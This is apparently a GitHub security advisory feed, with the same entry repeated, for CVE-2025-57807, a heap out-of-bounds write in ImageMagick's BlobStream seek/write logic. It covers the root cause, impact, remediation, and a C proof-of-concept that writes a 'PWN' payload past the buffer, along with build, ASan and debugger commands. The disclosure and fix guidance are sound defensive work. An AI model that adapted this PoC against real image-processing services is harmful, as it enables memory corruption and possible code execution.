        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
<p>An ASan&nbsp;<strong>WRITE</strong>&nbsp;crash in&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob</code></a>&nbsp;follows (top frames:&nbsp;<code>WriteBlob blob.c:&lt;line&gt;</code>, then&nbsp;<code>_platform_memmove</code>&nbsp;/&nbsp;<code>__sanitizer_internal_memmove</code>).</p>
<hr>
<h2 id="debugger-verification-manual">Debugger Verification (manual)</h2>
<p>LLDB can be used to snapshot the invariants; ASan alone is sufficient.</p>
<pre><code>lldb ./poc
(lldb) settings set use-color false
(lldb) break set -n WriteBlob
(lldb) run

# First stop (prime write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) continue

# Second stop (post-seek write)
(lldb) frame var length
(lldb) frame var image-&gt;blob-&gt;type image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum image-&gt;blob-&gt;mapped
(lldb) expr -- (unsigned long long)image-&gt;blob-&gt;offset + (unsigned long long)length
(lldb) expr -- (void*)((unsigned char*)image-&gt;blob-&gt;data + (size_t)image-&gt;blob-&gt;offset)

# Into the fault; if inside memmove (no locals):
(lldb) bt
(lldb) frame select 1
(lldb) frame var image-&gt;blob-&gt;offset image-&gt;blob-&gt;length image-&gt;blob-&gt;extent image-&gt;blob-&gt;quantum
</code></pre>
<h2 id="expected-at-second-stoptype--blobstream-·-offset-≈-0x10000000-256-mib-·-length-≈-34-·-extent-≈-64-kib-≪-offset--length-·-quantum-≈-128-kib-·-mapped--magickfalse-·-data--offset-far-beyond-base-next-continue-crashes-in-_platform_memmove"><strong>Expected at second stop:</strong><br><code>type = BlobStream</code>&nbsp;·&nbsp;<code>offset ≈ 0x10000000</code>&nbsp;(256 MiB) ·&nbsp;<code>length ≈ 3–4</code>&nbsp;·&nbsp;<code>extent ≈ 64 KiB</code>&nbsp;(≪&nbsp;<code>offset + length</code>) ·&nbsp;<code>quantum ≈ 128 KiB</code>&nbsp;·&nbsp;<code>mapped = MagickFalse</code>&nbsp;·&nbsp;<code>data + offset</code>&nbsp;far beyond base; next&nbsp;<code>continue</code>&nbsp;crashes in&nbsp;<code>_platform_memmove</code>.
    </h2>
<h2 id="credits">Credits</h2>
<p><strong>Reported by:</strong>&nbsp;Lumina Mescuwa</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e">https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57807">https://nvd.nist.gov/vuln/detail/CVE-2025-57807</a></li>
<li><a href="https://github.com/advisories/GHSA-23hg-53q6-hqfg">https://github.com/advisories/GHSA-23hg-53q6-hqfg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-23hg-53q6-hqfg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-09-05T20:09:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-OpenMP-arm64] ImageMagick BlobStream Forward-Seek Under-Allocation]]></title>
        <id>https://github.com/advisories/GHSA-23hg-53q6-hqfg</id>
        <link href="https://github.com/advisories/GHSA-23hg-53q6-hqfg"/>
        <updated>2025-09-10T20:49:21.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Reporter:</strong>&nbsp;Lumina Mescuwa<br><strong>Product:</strong>&nbsp;ImageMagick 7 (MagickCore)<br><strong>Component:</strong>&nbsp;<code>MagickCore/blob.c</code>&nbsp;(Blob I/O - BlobStream)<br><strong>Tested:</strong>&nbsp;7.1.2-0 (source tag) and 7.1.2-1 (Homebrew), macOS arm64, clang-17, Q16-HDRI<br><strong>Impact:</strong>&nbsp;Heap out-of-bounds&nbsp;<strong>WRITE</strong>&nbsp;(attacker-controlled bytes at attacker-chosen offset) → memory corruption; potential code execution  </p>
<hr>
<h2 id="executive-summary">Executive Summary</h2>
<p>For memory-backed blobs (<strong>BlobStream</strong>),&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;permits advancing the stream&nbsp;<strong>offset</strong>&nbsp;beyond the current end without increasing capacity. The subsequent&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;then expands by&nbsp;<strong><code>quantum + length</code></strong>&nbsp;(amortized) instead of&nbsp;<strong><code>offset + length</code></strong>, and copies to&nbsp;<code>data + offset</code>. When&nbsp;<code>offset ≫ extent</code>, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required.</p>
<hr>
<h2 id="affected-scope">Affected Scope</h2>
<ul>
<li><p><strong>Versions confirmed:</strong>&nbsp;7.1.2-0, 7.1.2-1</p>
</li>
<li><p><strong>Architectures:</strong>&nbsp;Observed on macOS arm64; architecture-agnostic on LP64</p>
</li>
<li><p>Paths: MagickCore blob subsystem —&nbsp;<strong>BlobStream</strong>&nbsp;(<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;and&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>).</p>
</li>
<li><p><strong>Not required:</strong>&nbsp;External delegates; special policies; integer wraparound</p>
</li>
</ul>
<hr>
<h2 id="technical-root-cause">Technical Root Cause</h2>
<p><strong>Types (LP64):</strong><br><code>offset: MagickOffsetType</code>&nbsp;(signed 64-bit)<br><code>extent/length/quantum: size_t</code>&nbsp;(unsigned 64-bit)<br><code>data: unsigned char*</code></p>
<p><strong>Contract mismatch:</strong></p>
<ul>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;(BlobStream) updates&nbsp;<code>offset</code>&nbsp;to arbitrary positions, including past end,&nbsp;<strong>without</strong>&nbsp;capacity adjustment.</p>
</li>
<li><p><a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;tests&nbsp;<code>offset + length &gt;= extent</code>&nbsp;and grows&nbsp;<strong>by</strong>&nbsp;<code>length + quantum</code>, doubles&nbsp;<code>quantum</code>, reallocates to&nbsp;<code>extent + 1</code>, then:</p>
<pre><code>q = data + (size_t)offset;
memmove(q, src, length);
</code></pre>
<p>  There is&nbsp;<strong>no guarantee</strong>&nbsp;that&nbsp;<code>extent ≥ offset + length</code>&nbsp;post-growth. With&nbsp;<code>offset ≫ extent</code>,&nbsp;<code>q</code>&nbsp;is beyond the allocation.</p>
</li>
</ul>
<p><strong>Wrap-free demonstration:</strong><br>Initialize&nbsp;<code>extent=1</code>, write one byte (<code>offset=1</code>), seek to&nbsp;<code>0x10000000</code>&nbsp;(256 MiB), then write 3–4 bytes. Growth remains &lt;&lt;&nbsp;<code>offset + length</code>; the copy overruns the heap buffer.</p>
<hr>
<h2 id="exploitability--reachability">Exploitability &amp; Reachability</h2>
<ul>
<li><p><strong>Primitive:</strong>&nbsp;Controlled bytes written at a controlled displacement from the buffer base.</p>
</li>
<li><p><strong>Reachability:</strong>&nbsp;Any encode-to-memory flow that forward-seeks prior to writing (e.g., header back-patching, reserved-space strategies). Even if current encoders/writers avoid this, the API contract&nbsp;<strong>permits</strong>&nbsp;it, thus creating a latent sink for first- or third-party encoders/writers.</p>
</li>
<li><p><strong>Determinism:</strong>&nbsp;Once a forward seek past end occurs, the first subsequent write reliably corrupts memory.</p>
</li>
</ul>
<hr>
<h2 id="impact-assessment">Impact Assessment</h2>
<ul>
<li><p><strong>Integrity:</strong>&nbsp;High - adjacent object/metadata overwrite plausible.</p>
</li>
<li><p><strong>Availability:</strong>&nbsp;High - reliably crashable (ASan and non-ASan).</p>
</li>
<li><p><strong>Confidentiality:</strong>&nbsp;High - Successful exploitation to RCE allows the attacker to read all data accessible by the compromised process.</p>
</li>
<li><p><strong>RCE plausibility:</strong>&nbsp;Typical of heap OOB writes in long-lived image services; allocator/layout dependent.</p>
</li>
</ul>
<hr>
<h2 id="cvss-v31-rationale-98">CVSS v3.1 Rationale (9.8)</h2>
<ul>
<li><p><strong>AV:N / PR:N / UI:N</strong>&nbsp;- server-side image processing is commonly network-reachable without auth or user action.</p>
</li>
<li><p><strong>AC:L</strong>&nbsp;- a single forward seek + write suffices; no races or specialized state.</p>
</li>
<li><p><strong>S:U</strong>&nbsp;- corruption localized to the ImageMagick process.</p>
</li>
<li><p><strong>C:H / I:H / A:H</strong>&nbsp;- A successful exploit leads to RCE, granting full control over the process. This results in a total loss of Confidentiality (reading sensitive data), Integrity (modifying files/data), and Availability (terminating the service).</p>
</li>
</ul>
<p><em>Base scoring assumes successful exploitation; environmental mitigations are out of scope of Base metrics.</em></p>
<hr>
<h2 id="violated-invariant">Violated Invariant</h2>
<blockquote>
<p><strong>Before copying&nbsp;<code>length</code>&nbsp;bytes at&nbsp;<code>offset</code>, enforce&nbsp;<code>extent ≥ offset + length</code>&nbsp;with overflow-checked arithmetic.</strong></p>
</blockquote>
<p>The BlobStream growth policy preserves amortized efficiency but fails to enforce this&nbsp;<strong>per-write</strong>&nbsp;safety invariant.</p>
<hr>
<h2 id="remediation-principle">Remediation (Principle)</h2>
<p>In&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5915-L5938"><code>WriteBlob()</code></a>&nbsp;(BlobStream case):</p>
<ol>
<li><p><strong>Checked requirement:</strong><br> <code>need = (size_t)offset + length;</code>&nbsp;→ if&nbsp;<code>need &lt; (size_t)offset</code>, overflow → fail.</p>
</li>
<li><p><strong>Ensure capacity ≥ need:</strong><br> <code>target = MagickMax(extent + quantum + length, need);</code><br> (Optionally loop, doubling&nbsp;<code>quantum</code>, until&nbsp;<code>extent ≥ need</code>&nbsp;to preserve amortization.)</p>
</li>
<li><p><strong>Reallocate to&nbsp;<code>target + 1</code>&nbsp;before copying;</strong>&nbsp;then perform the move.</p>
</li>
</ol>
<p><strong>Companion hardening (recommended):</strong></p>
<ul>
<li><p>Document or restrict&nbsp;<a href="https://github.com/ImageMagick/ImageMagick/blob/3fcd081c0278427fc0e8ac40ef75c0a1537792f7/MagickCore/blob.c#L5106-L5134"><code>SeekBlob()</code></a>&nbsp;on BlobStream so forward seeks either trigger explicit growth/zero-fill or require the subsequent write to meet the invariant.</p>
</li>
<li><p>Centralize blob arithmetic in checked helpers.</p>
</li>
<li><p>Unit tests: forward-seek-then-write (success and overflow-reject).</p>
</li>
</ul>
<hr>
<h2 id="regression--compatibility">Regression &amp; Compatibility</h2>
<ul>
<li><p><strong>Behavior change:</strong>&nbsp;Forward-seeked writes will either allocate to required size or fail cleanly (overflow/alloc-fail).</p>
</li>
<li><p><strong>Memory profile:</strong>&nbsp;Single writes after very large seeks may allocate large buffers; callers requiring sparse behavior should use file-backed streams.</p>
</li>
</ul>
<hr>
<h2 id="vendor-verification-checklist">Vendor Verification Checklist</h2>
<ul>
<li><p>Reproduce with a minimal in-memory BlobStream harness under ASan.</p>
</li>
<li><p>Apply fix; verify&nbsp;<code>extent ≥ offset + length</code>&nbsp;at all write sites.</p>
</li>
<li><p>Add forward-seek test cases (positive/negative).</p>
</li>
<li><p>Audit other growth sites (<code>SetBlobExtent</code>, stream helpers).</p>
</li>
<li><p>Clarify BlobStream seek semantics in documentation.</p>
</li>
<li><p>Unit test: forward seek to large offset on&nbsp;<strong>BlobStream</strong>&nbsp;followed by 1–8 byte writes; assert either growth to&nbsp;<code>need</code>&nbsp;or clean failure.</p>
</li>
</ul>
<hr>
<h1 id="poc--reproduction--notes">PoC / Reproduction / Notes</h1>
<h2 id="environment">Environment</h2>
<ul>
<li><p><strong>OS/Arch:</strong>&nbsp;macOS 14 (arm64)</p>
</li>
<li><p><strong>Compiler:</strong>&nbsp;clang-17 with AddressSanitizer</p>
</li>
<li><p><strong>ImageMagick:</strong>&nbsp;Q16-HDRI</p>
</li>
<li><p><strong>Prefix:</strong>&nbsp;<code>~/opt/im-7.1.2-0</code></p>
</li>
<li><p><strong><code>pkg-config</code>:</strong>&nbsp;from PATH (no hard-coded&nbsp;<code>/usr/local/...</code>)</p>
</li>
</ul>
<hr>
<h2 id="build-imagemagick-712-0-static-minimal">Build ImageMagick 7.1.2-0 (static, minimal)</h2>
<pre><code class="language-bash">./configure --prefix="$HOME/opt/im-7.1.2-0" --enable-hdri --with-quantum-depth=16 \
  --disable-shared --enable-static --without-modules \
  --without-magick-plus-plus --disable-openmp --without-perl \
  --without-x --without-lqr --without-gslib

make -j"$(sysctl -n hw.ncpu)"
make install

"$HOME/opt/im-7.1.2-0/bin/magick" -version &gt; magick_version.txt
</code></pre>
<hr>
<h2 id="build--run-the-poc-memory-backed-blobstream">Build &amp; Run the PoC (memory-backed BlobStream)</h2>
<p><strong><code>poc.c</code>:</strong><br><em>Uses private headers (<code>blob-private.h</code>) to exercise blob internals; a public-API variant (custom streams) is feasible but unnecessary for triage.</em></p>
<pre><code class="language-c">// poc.c

#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;MagickCore/MagickCore.h&gt;

#include &lt;MagickCore/blob.h&gt;

#include "MagickCore/blob-private.h"

  

int main(int argc, char **argv) {

MagickCoreGenesis(argv[0], MagickTrue);

ExceptionInfo *e = AcquireExceptionInfo();

ImageInfo *ii = AcquireImageInfo();

Image *im = AcquireImage(ii, e);

if (!im) return 1;

  

// 1-byte memory blob → BlobStream

unsigned char *buf = (unsigned char*) malloc(1);

buf[0] = 0x41;

AttachBlob(im-&gt;blob, buf, 1); // type=BlobStream, extent=1, offset=0

SetBlobExempt(im, MagickTrue); // don't free our malloc'd buf

  

// Step 1: write 1 byte (creates BlobInfo + sets offset=1)

unsigned char A = 0x42;

(void) WriteBlob(im, 1, &amp;A);

fprintf(stderr, "[+] after 1 byte: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 2: seek way past end without growing capacity

const MagickOffsetType big = (MagickOffsetType) 0x10000000; // 256 MiB

(void) SeekBlob(im, big, SEEK_SET);

fprintf(stderr, "[+] after seek: off=%lld len=%zu\n",

(long long) TellBlob(im), (size_t) GetBlobSize(im));

  

// Step 3: small write → reallocation grows by quantum+length, not to offset+length

// memcpy then writes to data + offset (OOB)

const unsigned char payload[] = "PWN";

(void) WriteBlob(im, sizeof(payload), payload);

  

// If we get here, it didn't crash

fprintf(stderr, "[-] no crash; check ASan flags.\n");

  

(void) CloseBlob(im);

DestroyImage(im); DestroyImageInfo(ii); DestroyExceptionInfo(e);

MagickCoreTerminus();

return 0;

}
</code></pre>
<hr>
<p><code>run:</code></p>
<pre><code class="language-bash"># Use the private prefix for pkg-config
export PKG_CONFIG_PATH="$HOME/opt/im-7.1.2-0/lib/pkgconfig:$PKG_CONFIG_PATH"

# Strict ASan for crisp failure
export ASAN_OPTIONS='halt_on_error=1:abort_on_error=1:detect_leaks=0:fast_unwind_on_malloc=0'

# Compile (static link pulls transitive deps via --static)
clang -std=c11 -g -O1 -fno-omit-frame-pointer -fsanitize=address -o poc poc.c \
  $(pkg-config --cflags MagickCore-7.Q16HDRI) \
  $(pkg-config --static --libs MagickCore-7.Q16HDRI)

# Execute and capture
./poc 2&gt;&amp;1 | tee asan.log
</code></pre>
<p><strong>Expected markers prior to the fault:</strong></p>
<pre><code>[+] after 1 byte: off=1 len=1
[+] after seek:  off=268435456 len=1
</code></pre>
